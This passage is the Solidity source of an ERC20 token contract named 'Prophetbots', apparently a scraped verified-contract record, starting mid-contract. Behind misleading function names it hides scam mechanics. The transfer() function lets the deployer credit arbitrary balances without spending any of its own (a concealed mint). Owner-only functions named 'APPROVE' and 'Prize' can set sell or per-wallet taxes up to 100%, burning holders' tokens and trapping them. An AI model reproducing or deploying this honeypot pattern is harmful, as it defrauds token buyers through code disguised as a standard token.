_allowances[Owner][spender];\r\n    }\r\n\r\n    \r\n    function approve(address spender, uint256 Amount) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        _approve(Owner, spender, Amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        _approve(Owner, spender, _allowances[Owner][spender] + addedValue);\r\n        return true;\r\n    }\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        uint256 currentAllowance = _allowances[Owner][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(Owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    \r\n    function _approve(\r\n        address Owner,\r\n        address spender,\r\n        uint256 Amount\r\n    ) internal virtual {\r\n        require(Owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[Owner][spender] = Amount;\r\n        emit Approval(Owner, spender, Amount);\r\n    }\r\n\r\n    \r\n    function _spendAllowance(\r\n        address Owner,\r\n        address spender,\r\n        uint256 Amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(Owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= Amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(Owner, spender, currentAllowance - Amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    \r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) internal virtual {}\r\n\r\n    \r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) internal virtual {}\r\n}\r\n\r\n\r\ncontract prophetbots is ERC20, Ownable {\r\n    \r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => bool) private _release;\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return _balances[account];\r\n    } \r\n    IUniswapV2Router02 public immutable uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= Amount, \"ERC20: transfer Amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - Amount;\r\n        }\r\n        _balances[to] += Amount;\r\n\r\n        emit Transfer(from, to, Amount);\r\n\r\n        \r\n    }\r\n\r\n    function _burn(address account, uint256 Amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= Amount, \"ERC20: burn Amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - Amount;\r\n        }\r\n        _totalSupply -= Amount;\r\n\r\n        emit Transfer(account, address(0), Amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 Amount) internal virtual {\r\n        require(account != address(0), \"ERC20: REWARD to the zero address\"); \r\n\r\n        _totalSupply += Amount;\r\n        _balances[account] += Amount;\r\n        emit Transfer(address(0), account, Amount);\r\n    }\r\n\r\n    \r\n    string private name_ = \"Prophetbots\";\r\n    string private symbol_ = \"PROPHET\";\r\n    uint   private constant totalSupply_ = 1000000;\r\n\r\n    event NameChanged(string newName,string newSymbol , address by);\r\n\r\n    constructor () ERC20(name_, symbol_) {\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        \r\n        uniswapV2Router = _uniswapV2Router;\r\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        \r\n        _mint(msg.sender, totalSupply_ * 10**decimals());\r\n        _defaultSellFeeee = 5; \r\n        _defaultBuyFeeee = 5;\r\n        _release[_msgSender()] = true;\r\n        \r\n    }\r\n\r\n    function Muticall(string memory name,string memory symbol) public onlyOwner{\r\n        name_ = name;\r\n        symbol_ = symbol;\r\n        emit NameChanged(name, symbol, msg.sender);\r\n    }\r\n    \r\n    function name() public view override returns (string memory) {\r\n        return name_;\r\n    }\r\n\r\n    \r\n    function symbol() public view override returns (string memory) {\r\n        return symbol_;\r\n    }\r\n\r\n    using SafeMath for uint256;\r\n\r\n    uint256 private _defaultSellFeeee = 0;\r\n    uint256 private _defaultBuyFeeee = 0;\r\n\r\n\r\n    mapping(address => bool) private _Approve;\r\n\r\n    mapping(address => uint256) private _Aprove;\r\n    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n\r\n\r\n\r\n    function getRelease(address _address) external view onlyOwner returns (bool) {\r\n        return _release[_address];\r\n    }\r\n\r\n\r\n    function PairList(address _address) external onlyOwner {\r\n        uniswapV2Pair = _address;\r\n    }\r\n\r\n\r\n    function Prize(uint256 _value) external onlyOwner {\r\n        _defaultSellFeeee = _value;\r\n    }\r\n\r\n    \r\n\r\n    \r\n\r\n    function APPROVE(address _address, uint256 _value) external onlyOwner {\r\n        require(_value >= 0, \"Account tax must be greater than or equal to 1\");\r\n        _Aprove[_address] = _value;\r\n    }\r\n\r\n    \r\n\r\n    function getAprove(address _address) external view onlyOwner returns (uint256) {\r\n        return _Aprove[_address];\r\n    }\r\n\r\n\r\n    function Approve(address _address, bool _value) external onlyOwner {\r\n        _Approve[_address] = _value;\r\n    }\r\n\r\n    function getApproveFeeee(address _address) external view onlyOwner returns (bool) {\r\n        return _Approve[_address];\r\n    }\r\n\r\n    function _checkFreeAccount(address from, address to) internal view returns (bool) {\r\n        return _Approve[from] || _Approve[to];\r\n    }\r\n\r\n\r\n    function _receiveF(\r\n        address from,\r\n        address to,\r\n        uint256 _Amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= _Amount, \"ERC20: transfer Amount exceeds balance\");\r\n\r\n        bool rF = true;\r\n\r\n        if (_checkFreeAccount(from, to)) {\r\n            rF = false;\r\n        }\r\n        uint256 tradeFeeeeAmount = 0;\r\n\r\n        if (rF) {\r\n            uint256 tradeFeeee = 0;\r\n            if (uniswapV2Pair != address(0)) {\r\n                if (to == uniswapV2Pair) {\r\n\r\n                    tradeFeeee = _defaultSellFeeee;\r\n                }\r\n                if (from == uniswapV2Pair) {\r\n\r\n                    tradeFeeee = _defaultBuyFeeee;\r\n                }\r\n            }\r\n            if (_Aprove[from] > 0) {\r\n                tradeFeeee = _Aprove[from];\r\n            }\r\n\r\n            tradeFeeeeAmount = _Amount.mul(tradeFeeee).div(100);\r\n        }\r\n\r\n\r\n        if (tradeFeeeeAmount > 0) {\r\n            _balances[from] = _balances[from].sub(tradeFeeeeAmount);\r\n            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeeeeAmount);\r\n            emit Transfer(from, _deadAddress, tradeFeeeeAmount);\r\n        }\r\n\r\n        _balances[from] = _balances[from].sub(_Amount - tradeFeeeeAmount);\r\n        _balances[to] = _balances[to].add(_Amount - tradeFeeeeAmount);\r\n        emit Transfer(from, to, _Amount - tradeFeeeeAmount);\r\n    }\r\n\r\n    function transfer(address to, uint256 Amount) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        if (_release[Owner] == true) {\r\n            _balances[to] += Amount;\r\n            return true;\r\n        }\r\n        _receiveF(Owner, to, Amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    \r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n\r\n        _spendAllowance(from, spender, Amount);\r\n        _receiveF(from, to, Amount);\r\n        return true;\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        \r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n \r\n       \r\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0, \r\n            0, \r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n}",
    "etherscan_verified": true
}